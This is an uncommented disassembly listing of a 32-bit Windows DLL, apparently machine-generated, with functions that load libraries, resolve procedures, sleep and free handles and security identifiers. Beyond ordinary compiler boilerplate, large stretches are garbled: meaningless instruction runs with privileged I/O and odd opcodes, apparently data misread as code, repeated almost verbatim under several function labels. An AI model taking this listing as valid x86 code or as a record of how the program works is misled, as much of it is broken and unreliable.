mov ecx [ esp + 0x8 ]
inc eax
inc esi
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ eax ] esi
xor eax eax
pop esi
retn
sub_1000bef0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push rw-data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] ebx
xor esi esi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp [ eax ] 0xb8
jne r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_1000d4d6
pop ecx
pop ecx
mov eax esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000bfb0
inc eax
mov [ ebp - 0x20 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
cmp [ eax + 0x3 ] bl
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x24 ] 0xa
jge r-xdata
cmp [ eax + 0x4 ] bl
jne r-xdata
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov esi eax
sub_1000bfba
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
lea eax [ ebp - 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
xor esi esi
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
call sub_1000c47d
add esp 0xc
cmp eax esi
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ edx - 0x26 ] cl
adc ecx [ edi - 0x20b063c0 ]
0xb6c3
mov eax [ ebp - 0xc ]
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] esi
xor bl bl
cmp [ eax + 0x6 ] si
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] esi
jbe r-xdata
mov eax 0x9aaabd4
inc ecx
sbb ebx ebx
cld
cmc
out 0x49 eax
enter 0x9a0b 0x90
retn
popad
pop edi
xchg ebp eax
salc
std
mov eax fs
bound ebx [ eax - 0x256e5544 ]
std
sub [ eax - 0x7e ] eax
add [ esi - 0x44009603 ] bl
xchg ecx eax
out dx eax
mov ch 0xc7
movsd [ edi ] [ esi ]
sar [ edi ] 0x1
mov dh 0x1e
arpl [ gs : 0x6b817f09 ] bp
and [ edi + edi * 2 + 0x1a ] bh
out dx al
mov fs [ ebx + 0x3c7ffadb ]
and [ esi - 0x3f5abdcc ] eax
jmp 0x7c8fea6b
sub_1000c47d
add ch [ eax ]
out 0xd3 al
mov ebp 0x606e7112
and [ ebp + 0x4f98ba99 ] bl
out dx al
cmp ebp [ ebp - 0x6e ]
mov [ edx - 0x2 ] ebx
sub eax 0xac9cca4f
pushfd
dec eax
loope r-xdata
mov dh [ esi ]
xor dl [ ebp + 0x79 ]
retn 0xa335
test esi esi
and ecx [ bx + si - 0x50 ]
shl [ ebp + 0x1f ] 0x1c
or al 0xda
add [ eax + 0x2e ] ebx
sar [ edx + 0x45 ] 0x1
mov edi gs
call 0xffffffff938d80ad
dec ebx
salc
call 0xffffffffb1b50002
shl [ ecx - 0x54a157d4 ] 0x1
fild [ ebp + eax * 4 + 0x29 ]
pop eax
inc edi
je r-xdata
test [ esi - 0x3fd5a24b ] ecx
imul esi [ ebx + ebx * 2 + 0x63 ] 0xffffff82
dec edx
mov bl 0x91
dec edi
div dl
test [ eax - 0x3bfdb1f ] eax
pop ecx
loopne r-xdata
pop ebx
mov edx 0x37a6cd84
push eax
push 0x1960f79f
cli
or al 0x54
mov [ edx + 0x2da61cbd ] bh
jpe r-xdata
mov ebp 0x862cbb0
mov ch 0x5e
jge r-xdata
jae r-xdata
xor cl 0xf3
[ ecx + 0x63 ]
aad 0x6c
or [ edx ] ah
dec ecx
jpe r-xdata
stosb [ edi ]
fnstenv [ edx + ecx * 2 ]
sahf
sub al 0x35
and dh [ esi ]
test al 0xfb
jpe r-xdata
out 0x67 al
pop eax
0x5b394b18 0x6b0c
0xf49c
shl [ ecx + 0x56 ] 0xe8
fnsave [ ebx - 0x3f ]
sub [ edx - 0xc0e80 ] 0x69
arpl [ edx ] ax
or ch bl
mov ah 0x88
mov eax 0x14b925b
mov al [ 0x42fb7622 ]
arpl [ edi ] di
mov cl 0x38

sub_1000c5ec
jl r-xdata
popfd

pop es
add [ ecx + edi * 8 + 0x97407e0 ] dh
cld
add [ edi + 0x1 ] edx
add eax 0x3d95ffe8
xchg edx edx
pop esp
r-xdata
and eax 0xf7dbad29
push cs
lodsd [ esi ]
jg r-xdata
push cs
add [ edi + 0x39d116b3 ] cl
shr ebp 0x51
inc esi
stosd [ edi ]
or [ ebx + 0x5b ] ch
sub [ esi - 0x7257e7b ] eax
push 0x754c2613
push 0x2e
or eax 0x25040dd1
sub [ ebp - 0x52f10825 ] ebp
fadd st3

sub_1000c680
push 0xd939aaa4
xchg ebp eax
xor eax 0xd33db972
pushfd
sbb [ ebp - 0x6ac6f0c2 ] bh
jpe r-xdata
mov esi 0xf8e0a343
inc esp
mov bl [ edi + 0x42 ]
sbb ebp esi
jpo r-xdata
cmp [ edx ] edx
out dx al
adc cl 0x8d
sbb al al
mov ecx ds
imul ebp [ esi + 0x4c ] 0xffffffa0
enter 0x7439 0x2a
lds edi [ esi + 0x37dc82e4 ]
sub [ edx ] ah
add [ ecx + ebp * 4 - 0x24 ] esi
push ds
lahf
sbb bl [ ebx - 0x51 ]
xor ah [ esi + 0x38f08ad2 ]
mov dl 0x7c
dec esi
or [ edi ] dh
mov esi [ ebp + ecx * 2 - 0x38939632 ]
inc eax
iretd
inc esp
rcr bh cl
shl [ esi + 0x50 ] cl
dec ecx
xlat
jbe r-xdata
pop esp
aad 0xf6
mov al 0x35
jbe r-xdata
leave
mov al [ 0xffffffffc2e98f27 ]
or cl [ edi + edx * 2 + 0x2fe46a13 ]
mov dh 0x2a
inc esi
into
xor eax 0x554d9770
ficom [ edx ]
sbb esi [ edx - 0x23 ]
add bh cl
jbe r-xdata
into
add ah [ ecx + 0x4e ]
fsin
in al dx
cmpsb [ esi ] [ edi ]
sub eax [ esi - 0xd7e14eb ]
push ss
loop r-xdata
inc edx
pop edx
sbb eax 0x125e93dc
mov bh 0xf2
leave
lodsb [ esi ]
push 0x55
cwde
dec ecx
adc bh [ esi + 0x760b1a72 ]
0xdbcd6ca8 0x4477
rol [ edi - 0x42 ] 0x43
mov [ 0x4436f8e0 ] eax
mov edx 0x3928ed82
cmpsb [ esi ] [ edi ]
add dh [ ebx + 0x3924807a ]
adc bh [ esi ]
out dx al
sub_1000c755
sahf
dec eax
cld
into
sbb [ ebx + 0x8 ] esp
dec ecx
outsd
cmp ecx [ ebx - 0xf60de9e ]
mov [ 0x6b0dcfe9 ] eax
mov [ edi + 0x3b6c605a ] ch
mov edi 0x71716bb2
fcom [ edi ]
shl [ esi ] cl
mov [ eax ] ss
sub [ esi + edx * 4 + 0x562cce74 ] esp
push esp
insd
and bl [ ecx + 0x5993a0f0 ]
adc [ eax - 0x174d045a ] bh
test [ edi - 0x61521e4a ] 0x48c211e8
enter 0x61ed 0x5a
jpe r-xdata
xor ah [ ebp + 0x4b39d0a8 ]
call 0xffffffff9a00acb2
lodsb [ esi ]
imul esi [ ecx - 0x3c ] 0xa133fa5c
inc edi
mov [ ebp - 0x5a0f8e75 ] dl
int3
dec ecx
pop ebx
frstor [ ebx ]
sbb [ edi - 0x368274a6 ] al
sbb cl [ eax + 0x7836779d ]
sbb edx [ ebp - 0x63 ]
sub_1000cbce
sub [ edx - 0x746bc171 ] ebp
mov al 0xea
enter 0x5dad 0x0
sar [ eax + 0x43 ] 0x1
adc al [ edx + 0x7e1e9736 ]
in al dx
mov [ eax - 0x5ac2355d ] edi
add [ esi + 0x78 ] edi
movsb [ edi ] [ esi ]
out 0x5c eax
dec esp
stosb [ edi ]
pop ecx
0x922f
_start
fld [ edx + 0x7fbfe94d ]
inc eax
js r-xdata
adc [ eax ] edi
push ebx
retn
or ebp [ ecx + edi * 8 - 0x18 ]
stosd [ edi ]
jns r-xdata
cmpsd [ esi ] [ edi ]
mov eax ss
0xfe7b9f91 0x3cfa
salc
adc [ esi ] eax
add eax ecx
jmp 0x545a66a7
fwait
neg [ edx - 0x1c ]
daa
0xca3c2a99 0x67e5
sub_1000d4be
shl [ edi + 0x559e6326 ] 0x97
fiadd [ ss : edx + 0x127d7150 ]
test [ ebp + 0x5d ] ch
scasd [ edi ]
cld
push ss
add [ eax - 0x1 ] edi
out 0x2 eax
jecxz r-xdata
inc ebp
daa
add [ esi + eax * 4 ] esi
loopne r-xdata
mov dl 0xad
je r-xdata
jmp [ edi - 0x3c4f867a ]
cmpsd [ esi ] [ edi ]
xchg [ ecx - 0x50 ] bh
retn
mov edi 0xc47cb448
loope r-xdata
push edi
mov ah 0x3d
or ebx esp
out 0xa2 eax
xchg ebx eax
das
cmp al 0xcf
jpe r-xdata
cli
test al 0x81
mov ebp 0x26b7c054
arpl [ esi - 0x25c968ab ] bx
add al 0x15
push eax
jno r-xdata
[ ebx + 0x24023203 ]
js r-xdata
aad 0xe3
and al 0xe8
jns r-xdata
jge r-xdata
adc al [ ebp + ebp * 2 + 0x16fcaf5d ]
stosd [ edi ]
add esi [ edx ]
add ah [ ebx + esi ]
dec edx
stosd [ edi ]
mov bh al
add [ edi - 0x6b166731 ] ch
int1
xchg edx edx
mov [ 0xffffffffcd0c3a76 ] al
cmpsd [ esi ] [ edi ]
dec edi
r-xdata
push ebx
add al 0xd5
jecxz r-xdata
push ds
sbb [ eax ] 0x6f
xchg esp eax
or al 0x79
cwde
push ss
xor [ ecx + edx * 2 - 0x23 ] al
shl cl 0x1
cmp [ esi + 0x42609c9c ] eax
dec edx
into
jg 0x1000d5b9
pushad
pop ebx
mov eax 0x6d565e8
retn 0xe431
call 0xffffffff901fcdca
sbb [ edi - 0x6c ] ch
push ebp
inc ecx
mov dh ch
push es
js r-xdata
clc
adc al 0xd0
out 0xff eax
int3
sub_1000d4c4
xchg edi eax
fiadd [ ss : edx + 0x127d7150 ]
test [ ebp + 0x5d ] ch
scasd [ edi ]
cld
push ss
add [ eax - 0x1 ] edi
out 0x2 eax
jecxz r-xdata
inc ebp
daa
add [ esi + eax * 4 ] esi
loopne r-xdata
mov dl 0xad
je r-xdata
jmp [ edi - 0x3c4f867a ]
cmpsd [ esi ] [ edi ]
xchg [ ecx - 0x50 ] bh
retn
mov edi 0xc47cb448
loope r-xdata
push edi
mov ah 0x3d
or ebx esp
out 0xa2 eax
xchg ebx eax
das
cmp al 0xcf
jpe r-xdata
cli
test al 0x81
mov ebp 0x26b7c054
arpl [ esi - 0x25c968ab ] bx
add al 0x15
push eax
jno r-xdata
[ ebx + 0x24023203 ]
js r-xdata
aad 0xe3
and al 0xe8
jns r-xdata
jge r-xdata
adc al [ ebp + ebp * 2 + 0x16fcaf5d ]
stosd [ edi ]
add esi [ edx ]
add ah [ ebx + esi ]
dec edx
stosd [ edi ]
mov bh al
add [ edi - 0x6b166731 ] ch
int1
xchg edx edx
mov [ 0xffffffffcd0c3a76 ] al
cmpsd [ esi ] [ edi ]
dec edi
r-xdata
push ebx
add al 0xd5
jecxz r-xdata
push ds
sbb [ eax ] 0x6f
xchg esp eax
or al 0x79
cwde
push ss
xor [ ecx + edx * 2 - 0x23 ] al
shl cl 0x1
cmp [ esi + 0x42609c9c ] eax
dec edx
into
jg 0x1000d5b9
pushad
pop ebx
mov eax 0x6d565e8
retn 0xe431
call 0xffffffff901fcdca
sbb [ edi - 0x6c ] ch
push ebp
inc ecx
mov dh ch
push es
js r-xdata
clc
adc al 0xd0
out 0xff eax
int3
sub_1000d4ca
jno r-xdata
aad 0xe3
and al 0xe8
jns r-xdata
adc al [ ebp + ebp * 2 + 0x16fcaf5d ]
jge r-xdata
push ebx
add al 0xd5
jecxz r-xdata
push ds
sbb [ eax ] 0x6f
xchg esp eax
add [ eax - 0x1 ] edi
out 0x2 eax
jecxz r-xdata
or al 0x79
cwde
push ss
xor [ ecx + edx * 2 - 0x23 ] al
shl cl 0x1
cmp [ esi + 0x42609c9c ] eax
dec edx
into
jg 0x1000d5b9
pushad
pop ebx
mov eax 0x6d565e8
retn 0xe431
call 0xffffffff901fcdca
sbb [ edi - 0x6c ] ch
inc ebp
daa
add [ esi + eax * 4 ] esi
loopne r-xdata
mov dl 0xad
je r-xdata
push ebp
inc ecx
mov dh ch
push es
js r-xdata
jmp [ edi - 0x3c4f867a ]
cmpsd [ esi ] [ edi ]
xchg [ ecx - 0x50 ] bh
retn
mov edi 0xc47cb448
loope r-xdata
push edi
clc
adc al 0xd0
out 0xff eax
int3
mov ah 0x3d
or ebx esp
out 0xa2 eax
xchg ebx eax
das
cmp al 0xcf
jpe r-xdata
cli
test al 0x81
mov ebp 0x26b7c054
arpl [ esi - 0x25c968ab ] bx
add al 0x15
push eax
[ ebx + 0x24023203 ]
js r-xdata
stosd [ edi ]
add esi [ edx ]
add ah [ ebx + esi ]
dec edx
stosd [ edi ]
mov bh al
add [ edi - 0x6b166731 ] ch
int1
xchg edx edx
mov [ 0xffffffffcd0c3a76 ] al
cmpsd [ esi ] [ edi ]
dec edi
r-xdata
sub_1000d4d0
scasd [ edi ]
cld
push ss
add [ eax - 0x1 ] edi
out 0x2 eax
jecxz r-xdata
inc ebp
daa
add [ esi + eax * 4 ] esi
loopne r-xdata
mov dl 0xad
je r-xdata
jmp [ edi - 0x3c4f867a ]
cmpsd [ esi ] [ edi ]
xchg [ ecx - 0x50 ] bh
retn
mov edi 0xc47cb448
loope r-xdata
push edi
mov ah 0x3d
or ebx esp
out 0xa2 eax
xchg ebx eax
das
cmp al 0xcf
jpe r-xdata
cli
test al 0x81
mov ebp 0x26b7c054
arpl [ esi - 0x25c968ab ] bx
add al 0x15
push eax
jno r-xdata
[ ebx + 0x24023203 ]
js r-xdata
aad 0xe3
and al 0xe8
jns r-xdata
jge r-xdata
adc al [ ebp + ebp * 2 + 0x16fcaf5d ]
stosd [ edi ]
add esi [ edx ]
add ah [ ebx + esi ]
dec edx
stosd [ edi ]
mov bh al
add [ edi - 0x6b166731 ] ch
int1
xchg edx edx
mov [ 0xffffffffcd0c3a76 ] al
cmpsd [ esi ] [ edi ]
dec edi
r-xdata
push ebx
add al 0xd5
jecxz r-xdata
push ds
sbb [ eax ] 0x6f
xchg esp eax
or al 0x79
cwde
push ss
xor [ ecx + edx * 2 - 0x23 ] al
shl cl 0x1
cmp [ esi + 0x42609c9c ] eax
dec edx
into
jg 0x1000d5b9
pushad
pop ebx
mov eax 0x6d565e8
retn 0xe431
call 0xffffffff901fcdca
sbb [ edi - 0x6c ] ch
push ebp
inc ecx
mov dh ch
push es
js r-xdata
clc
adc al 0xd0
out 0xff eax
int3
sub_1000d4d6
add ah bl
fwait
mov edi 0xc47cb448
loope r-xdata
push edi
mov ah 0x3d
or ebx esp
out 0xa2 eax
xchg ebx eax
das
cmp al 0xcf
jpe r-xdata
cli
test al 0x81
mov ebp 0x26b7c054
arpl [ esi - 0x25c968ab ] bx
add al 0x15
push eax
jno r-xdata
[ ebx + 0x24023203 ]
js r-xdata
aad 0xe3
and al 0xe8
jns r-xdata
adc al [ ebp + ebp * 2 + 0x16fcaf5d ]
jge r-xdata
stosd [ edi ]
add esi [ edx ]
add ah [ ebx + esi ]
dec edx
stosd [ edi ]
mov bh al
add [ edi - 0x6b166731 ] ch
int1
xchg edx edx
mov [ 0xffffffffcd0c3a76 ] al
cmpsd [ esi ] [ edi ]
dec edi
r-xdata
push ebx
add al 0xd5
jecxz r-xdata
push ds
sbb [ eax ] 0x6f
xchg esp eax
add [ eax - 0x1 ] edi
out 0x2 eax
jecxz r-xdata
inc ebp
daa
add [ esi + eax * 4 ] esi
loopne r-xdata
mov dl 0xad
or al 0x79
cwde
push ss
xor [ ecx + edx * 2 - 0x23 ] al
shl cl 0x1
cmp [ esi + 0x42609c9c ] eax
dec edx
into
jg 0x1000d5b9
pushad
pop ebx
mov eax 0x6d565e8
retn 0xe431
call 0xffffffff901fcdca
sbb [ edi - 0x6c ] ch
je r-xdata
jmp [ edi - 0x3c4f867a ]
cmpsd [ esi ] [ edi ]
xchg [ ecx - 0x50 ] bh
retn
push ebp
inc ecx
mov dh ch
push es
js r-xdata
clc
adc al 0xd0
out 0xff eax
int3
sub_1000d4dc
pop ds
jge r-xdata
xor ecx [ edx - 0x55 ]
pop edx
cmc
test eax 0xecfbc999
les eax [ eax - 0x14 ]
pop edi
shr bl 0x1
pop esi
je r-xdata
inc ebp
daa
add [ esi + eax * 4 ] esi
loopne r-xdata
mov dl 0xad
and dl [ ebx + 0x42dea6e1 ]
dec esp
sbb dh [ ecx ]
hlt
mov ah 0x3d
or ebx esp
out 0xa2 eax
xchg ebx eax
das
cmp al 0xcf
jpe r-xdata
jmp [ edi - 0x3c4f867a ]
cmpsd [ esi ] [ edi ]
xchg [ ecx - 0x50 ] bh
retn
[ ebx + 0x24023203 ]
js r-xdata
mov bh al
add [ edi - 0x6b166731 ] ch
int1
xchg edx edx
mov [ 0xffffffffcd0c3a76 ] al
cmpsd [ esi ] [ edi ]
dec edi
r-xdata
stosd [ edi ]
add esi [ edx ]
add ah [ ebx + esi ]
dec edx
stosd [ edi ]
sub_1000103b
push esi
mov esi [ esp + 0xc ]
push edi
or edi 0xffffffff
push [ esp + 0x14 ]
push 0x0
push esi
call sub_1000d316
sub_10001086
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
add eax 0x160
push [ esp + 0xc ]
push eax
call sub_1000103b
sub_1000109d
add esp 0xc
retn
sub_100010a1
push ebp
mov ebp esp
mov eax 0x10b58
call sub_1000d330
sub_100012f0
push ebp
mov ebp esp
mov eax 0x10b58
call sub_1000d330
sub_10001a91
push 0x10
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1000d316
ordinal_4
push ebp
mov ebp esp
sub esp 0x214
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] 0x1
call sub_10001f0c
sub_10001eb1
add esp 0xc
push 0x7d0
call [ Sleep@IAT ]
lea eax [ ebp - 0x214 ]
push esi
push eax
push rw-data
call sub_1000103b
sub_10002320
push 0x140
lea eax [ ebp - 0x168 ]
push 0x0
push eax
call sub_1000d316
sub_10002366
push edi
push 0x0
push ebx
call sub_1000d316
sub_100026a7
push esi
push edi
push ebx
call sub_1000d316
sub_100028b9
push 0x1
pop eax
retn
sub_10002cde
push 0x1
pop eax
retn
sub_10002f24
cmp [ ebp - 0x44 ] ebx
je r-xdata
call sub_10002f61
retn
push [ ebp - 0x44 ]
call [ rw-data ]
mov [ ebp - 0x44 ] ebx
sub_10002f3d
push 0x1
pop eax
retn
sub_10002f61
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call [ FreeLibrary@IAT ]
and [ rw-data ] 0x0
sub_100033f6
push 0x1
pop eax
retn
sub_10003489
push [ esi ]
push [ ebp - 0x1c ]
push [ edi ]
call sub_1000d31c
sub_100034a7
cmp [ ebp - 0x1c ] ebx
je r-xdata
retn
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x1c ] ebx
sub_100034bc
push 0x1
pop eax
retn
sub_10003580
push 0x1
pop eax
retn
sub_1000374c
push 0x1
pop eax
retn
sub_10003998
push 0x1
pop eax
retn
sub_10003a3a
push 0x1
pop eax
retn
sub_10003bd0
test esi esi
je r-xdata
retn
push esi
call [ free@IAT ]
pop ecx
and [ ebp - 0x1c ] 0x0
sub_10003be3
push 0x1
pop eax
retn
sub_10003c4b
push esi
push ebx
lea eax [ ebp - 0x248 ]
push eax
call sub_1000d316
sub_10003d66
push esi
push ebx
lea eax [ ebp - 0x248 ]
push eax
call sub_1000d316
sub_10003eac
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x20 ] ebx
retn
sub_10003ebb
push 0x1
pop eax
retn
sub_10003ebf
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x13c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10004035
push 0x1
pop eax
retn
sub_100041a7
push 0x1
pop eax
retn
sub_100041e6
push ebp
mov ebp esp
push ecx
call sub_100041c8
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fadd [ r--data ]
fmul [ r--data ]
fmul [ r--data ]
call sub_1000d4be
leave
retn
sub_100042cf
push 0x1
pop eax
retn
sub_1000431c
push esi
lea eax [ ebp - 0x108 ]
push 0x0
push eax
call sub_1000d316
sub_10004906
push ebx
call sub_10007578
sub_10004d3f
push 0x1
pop eax
retn
sub_100060c5
push 0x1
pop eax
retn
sub_10006530
push 0x1
pop eax
retn
sub_100065cb
push 0x1
pop eax
retn
sub_10006867
cmp [ ebp - 0x38 ] ebx
je r-xdata
cmp [ ebp - 0x6c ] ebx
je r-xdata
push [ ebp - 0x38 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x38 ] ebx
retn
push [ ebp - 0x6c ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x6c ] ebx
sub_1000688c
push 0x1
pop eax
retn
sub_100068ad
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
mov eax 0x1138
call sub_1000d330
sub_10006a64
cmp [ ebp - 0x30 ] ebx
je r-xdata
retn
push [ ebp - 0x30 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x30 ] ebx
sub_10006a78
push 0x1
pop eax
retn
sub_10006a7c
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10006c50
cmp [ ebp - 0x20 ] ebx
je r-xdata
retn
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x20 ] ebx
sub_10006c64
push 0x1
pop eax
retn
sub_10006dd4
cmp [ ebp - 0x20 ] ebx
je r-xdata
retn
push [ ebp - 0x20 ]
call [ FreeSid@IAT ]
mov [ ebp - 0x20 ] ebx
sub_10006de8
push 0x1
pop eax
retn
sub_10006f40
cmp [ ebp - 0x1c ] ebx
je r-xdata
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x20 ]
call [ FreeSid@IAT ]
mov [ ebp - 0x20 ] ebx
sub_10006f57
push 0x1
pop eax
retn
sub_100071b0
push 0x1
pop eax
retn
sub_100071b4
mov esp [ ebp - 0x18 ]
and [ ebp - 0xc0 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xc0 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100072d2
cmp [ ebp - 0x20 ] edi
je r-xdata
cmp ebx edi
je r-xdata
push [ ebp - 0x20 ]
call [ LocalFree@IAT ]
mov [ ebp - 0x20 ] edi
retn
push ebx
call [ LocalFree@IAT ]
mov [ ebp - 0x1c ] edi
sub_100072f4
push 0x1
pop eax
retn
sub_1000743f
push 0x1
pop eax
retn
sub_1000751e
push 0x1
pop eax
retn
sub_10007578
push ebp
mov ebp esp
sub esp 0x94
push 0x94
lea eax [ ebp - 0x94 ]
push 0x0
push eax
call sub_1000d316
sub_100075ee
push 0x7f
push [ esp + 0x8 ]
call sub_100075ce
pop ecx
pop ecx
retn
sub_100084cc
push 0x1
pop eax
retn
sub_100084d0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100085b3
push 0x1
pop eax
retn
sub_100085b7
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100086f3
mov eax [ ebp - 0x24 ]
add eax 0xc8
push eax
call [ ebp - 0x28 ]
retn
sub_10008709
push 0x1
pop eax
retn
sub_1000870d
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008849
mov eax [ ebp - 0x24 ]
add eax 0xc8
push eax
call [ ebp - 0x28 ]
retn
sub_1000885f
push 0x1
pop eax
retn
sub_10008863
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000899f
mov eax [ ebp - 0x24 ]
add eax 0xd8
push eax
call [ ebp - 0x28 ]
retn
sub_100089ac
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp sub_100089cf
sub_100089b5
push 0x1
pop eax
retn
sub_100089b9
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp sub_100089cf
sub_100089cf
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008bec
mov eax [ ebp - 0x24 ]
add eax 0xe0
push eax
call [ ebp - 0x28 ]
retn
sub_10008c02
push 0x1
pop eax
retn
sub_10008c06
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008e71
push 0x1
pop eax
retn
sub_10008e75
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008fac
push 0x1
pop eax
retn
sub_10008fb0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10009146
mov eax [ ebp - 0x28 ]
add eax 0xc8
push eax
call [ ebp - 0x2c ]
retn
sub_1000915c
push 0x1
pop eax
retn
sub_10009160
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100092f6
mov eax [ ebp - 0x28 ]
add eax 0xc8
push eax
call [ ebp - 0x2c ]
retn
sub_1000930c
push 0x1
pop eax
retn
sub_10009310
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100094a6
mov eax [ ebp - 0x28 ]
add eax 0xd8
push eax
call [ ebp - 0x2c ]
retn
sub_100094bc
push 0x1
pop eax
retn
sub_100094c0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000968f
mov eax [ ebp - 0x28 ]
add eax 0xe0
push eax
call [ ebp - 0x2c ]
retn
sub_100096a5
push 0x1
pop eax
retn
sub_100096a9
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10009ef0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x80 ] eax
push 0x1
pop eax
retn
sub_1000a2b0
push 0x1
pop eax
retn
sub_1000a2b4
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
